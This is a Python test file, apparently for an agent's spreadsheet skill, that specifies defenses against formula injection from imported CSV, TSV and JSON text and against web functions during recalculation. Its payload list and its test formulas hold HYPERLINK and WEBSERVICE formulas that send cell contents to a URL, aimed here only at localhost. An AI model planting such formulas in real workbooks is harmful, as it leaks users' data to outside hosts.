"""Security spec: text from outside a workbook must not become a live formula.

These tests fail while imported CSV, TSV, JSON, and direct cell text that
starts with "=" (or "{=") is stored as a formula and while recalc.py will
still evaluate a web function. They pass once both of the following exist:

* skills/xlsx/scripts/external_cells.py provides
  write_external_dataframe(df, path, engine=None) and
  assign_external_value(cell, value). Those must store the original text
  as a string (a leading apostrophe is allowed) and must not write a
  formula part. engine selects the pandas writer ("openpyxl" or
  "xlsxwriter") and must not change that result.
* skills/xlsx/SKILL.md tells agents that outside data (CSV, TSV, JSON,
  scraped or other imported text) must never be written as a formula, and
  it names a concrete control (strings_to_formulas or an openpyxl
  data_type).
* recalc() refuses WEBSERVICE and FILTERXML, including an _xlfn. prefix
  and any letter case, before LibreOffice rewrites the file.

Until then, the tests follow the guide's prescribed path: pandas
DataFrame.to_excel and openpyxl cell assignment.

Run from the repository root:

    python3 skills/xlsx/tests/test_external_formula_injection.py
"""

from __future__ import annotations

import importlib
import shutil
import sys
import tempfile
import threading
import unittest
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pandas as pd
from openpyxl import Workbook, load_workbook

REPO_ROOT = Path(__file__).resolve().parents[3]
SKILL_DIR = REPO_ROOT / "skills" / "xlsx"
SCRIPTS_DIR = SKILL_DIR / "scripts"
SKILL_MD = SKILL_DIR / "SKILL.md"

if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

from recalc import recalc  # noqa: E402


# Payloads a CSV cell can carry. The first three are stored as formulas by
# the libraries the skill tells agents to use. The others are Excel formula
# triggers that those libraries currently leave as strings; they stay in the
# spec so a fix cannot turn them into formulas either.
EXTERNAL_PAYLOADS = (
    '=HYPERLINK("http://127.0.0.1/h?d="&C2,C2)',
    '=_xlfn.WEBSERVICE("http://127.0.0.1/c?d="&C2)',
    "{=1+1}",
    "+1+1",
    "-1+1",
    "@C2",
    "\t=1+1",
    "\r=1+1",
)


def _external_cells():
    try:
        return importlib.import_module("external_cells")
    except ImportError:
        return None


def write_external_dataframe(df, path, engine=None):
    """Write tabular text the way this skill tells an agent to.

    Uses external_cells.write_external_dataframe when the skill provides it.
    Otherwise uses pandas DataFrame.to_excel, which is the bulk-data path in
    SKILL.md.
    """
    module = _external_cells()
    writer = getattr(module, "write_external_dataframe", None) if module else None
    if writer is not None:
        if engine is None:
            writer(df, path)
        else:
            writer(df, path, engine=engine)
        return
    kwargs = {"index": False}
    if engine is not None:
        kwargs["engine"] = engine
    df.to_excel(path, **kwargs)


def assign_external_value(cell, value):
    """Assign one outside-data string the way this skill tells an agent to."""
    module = _external_cells()
    assign = getattr(module, "assign_external_value", None) if module else None
    if assign is not None:
        assign(cell, value)
        return
    cell.value = value


def _frame():
    rows = [("plain", "hello", "kept")]
    rows.extend((f"row{i}", payload, "neighbor") for i, payload in enumerate(EXTERNAL_PAYLOADS, start=1))
    return pd.DataFrame(rows, columns=["label", "note", "secret"])


def _assert_text_cell(test, cell, payload):
    test.assertNotEqual(
        cell.data_type,
        "f",
        f"{cell.coordinate} stored {payload!r} as a formula ({cell.value!r})",
    )
    test.assertEqual(cell.data_type, "s")
    text = "" if cell.value is None else str(cell.value)
    test.assertTrue(
        text == payload or text == "'" + payload,
        f"{cell.coordinate} changed imported text {payload!r} into {text!r}",
    )


def _assert_no_formula_parts(test, path):
    with zipfile.ZipFile(path) as archive:
        for name in archive.namelist():
            if not name.startswith("xl/worksheets/") or not name.endswith(".xml"):
                continue
            xml = archive.read(name).decode("utf-8")
            test.assertNotIn("<f", xml, f"{name} contains a formula part")


class ExternalTextStoredAsText(unittest.TestCase):
    def test_csv_round_trip_openpyxl_engine(self):
        self._round_trip_separator(",", engine="openpyxl")

    def test_csv_round_trip_xlsxwriter_engine(self):
        self._round_trip_separator(",", engine="xlsxwriter")

    def test_tsv_round_trip_openpyxl_engine(self):
        self._round_trip_separator("\t", engine="openpyxl")

    def test_tsv_round_trip_xlsxwriter_engine(self):
        self._round_trip_separator("\t", engine="xlsxwriter")

    def test_json_round_trip_both_engines(self):
        frame = _frame()
        for engine in ("openpyxl", "xlsxwriter"):
            with self.subTest(engine=engine):
                with tempfile.TemporaryDirectory() as tmp:
                    source = Path(tmp) / "rows.json"
                    source.write_text(frame.to_json(orient="records"), encoding="utf-8")
                    loaded = pd.read_json(source, dtype=str)
                    # read_json keeps column order from the file.
                    loaded = loaded[["label", "note", "secret"]]
                    path = Path(tmp) / "out.xlsx"
                    write_external_dataframe(loaded, path, engine=engine)
                    self._assert_workbook(path)

    def test_default_to_excel_engine(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "out.xlsx"
            write_external_dataframe(_frame(), path)
            self._assert_workbook(path)

    def test_openpyxl_cell_assignment_and_append(self):
        wb = Workbook()
        ws = wb.active
        for index, payload in enumerate(EXTERNAL_PAYLOADS, start=1):
            assign_external_value(ws.cell(index, 1), payload)
        # A second sheet covers Worksheet.append, which sets cell values too.
        appended = wb.create_sheet("appended")
        for payload in EXTERNAL_PAYLOADS:
            row = [payload]
            module = _external_cells()
            append_row = getattr(module, "append_external_row", None) if module else None
            if append_row is not None:
                append_row(appended, row)
            else:
                appended.append(row)
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "direct.xlsx"
            wb.save(path)
            saved = load_workbook(path, data_only=False)
            try:
                for index, payload in enumerate(EXTERNAL_PAYLOADS, start=1):
                    _assert_text_cell(self, saved.active.cell(index, 1), payload)
                    _assert_text_cell(self, saved["appended"].cell(index, 1), payload)
                _assert_no_formula_parts(self, path)
            finally:
                saved.close()

    def _round_trip_separator(self, separator, engine):
        frame = _frame()
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / ("rows.tsv" if separator == "\t" else "rows.csv")
            frame.to_csv(source, index=False, sep=separator)
            loaded = pd.read_csv(source, sep=separator, dtype=str, keep_default_na=False)
            path = Path(tmp) / "out.xlsx"
            write_external_dataframe(loaded, path, engine=engine)
            self._assert_workbook(path)

    def _assert_workbook(self, path):
        wb = load_workbook(path, data_only=False)
        try:
            ws = wb.active
            # Row 1 is the header. Each payload is the note column of the following rows.
            for offset, payload in enumerate(EXTERNAL_PAYLOADS, start=3):
                _assert_text_cell(self, ws.cell(offset, 2), payload)
                self.assertEqual(ws.cell(offset, 3).value, "neighbor")
            _assert_no_formula_parts(self, path)
        finally:
            wb.close()


class SkillGuideForbidsImportedFormulas(unittest.TestCase):
    def test_guide_requires_neutralizing_outside_text(self):
        text = SKILL_MD.read_text(encoding="utf-8")
        lowered = text.lower()
        self.assertTrue(
            "strings_to_formulas" in text or "data_type" in text,
            "SKILL.md must name strings_to_formulas or an openpyxl data_type "
            "when it tells agents how to keep imported text as text",
        )
        self.assertRegex(
            lowered,
            r"(outside|external|imported|untrusted).{0,120}formula|formula.{0,120}(outside|external|imported|untrusted)",
        )


class RecalcRefusesWebFunctions(unittest.TestCase):
    def test_web_function_is_refused_without_rewriting_or_fetching(self):
        if shutil.which("soffice") is None:
            self.fail("soffice is not installed; recalc could not be exercised")

        hits = []

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                hits.append(self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, fmt, *args):
                return

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            formulas = (
                f'=WEBSERVICE("http://127.0.0.1:{port}/c?d="&A1)',
                f'=_xlfn.WEBSERVICE("http://127.0.0.1:{port}/c?d="&A1)',
                f'=webservice("http://127.0.0.1:{port}/c?d="&A1)',
                f'=FILTERXML("http://127.0.0.1:{port}/x","//a")',
                f'=_xlfn.FILTERXML("http://127.0.0.1:{port}/x","//a")',
            )
            for formula in formulas:
                with self.subTest(formula=formula):
                    with tempfile.TemporaryDirectory() as tmp:
                        path = Path(tmp) / "book.xlsx"
                        wb = Workbook()
                        ws = wb.active
                        ws["A1"] = "neighbor-value"
                        # A formula the agent itself might have written, beside the injected one.
                        ws["B1"] = "=1+1"
                        ws["C1"] = formula
                        wb.save(path)
                        wb.close()
                        before = path.read_bytes()
                        result = recalc(str(path), timeout=60)
                        self.assertIn(
                            "error",
                            result,
                            f"recalc evaluated a web function and returned {result}",
                        )
                        message = str(result["error"]).lower()
                        self.assertTrue(
                            "webservice" in message or "filterxml" in message or "web function" in message,
                            f"refusal did not identify the web function: {result['error']}",
                        )
                        self.assertEqual(
                            path.read_bytes(),
                            before,
                            "recalc rewrote the workbook before refusing the web function",
                        )
                        self.assertEqual(hits, [], f"recalc fetched a web-function URL: {hits}")
                        hits.clear()
        finally:
            server.shutdown()

    def test_arithmetic_formula_still_recalculates(self):
        if shutil.which("soffice") is None:
            self.fail("soffice is not installed; recalc could not be exercised")
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sum.xlsx"
            wb = Workbook()
            wb.active["A1"] = "=1+1"
            wb.save(path)
            wb.close()
            result = recalc(str(path), timeout=60)
            self.assertEqual(result.get("status"), "success", result)
            wb = load_workbook(path, data_only=True)
            try:
                self.assertEqual(wb.active["A1"].value, 2)
            finally:
                wb.close()


if __name__ == "__main__":
    unittest.main(verbosity=2)
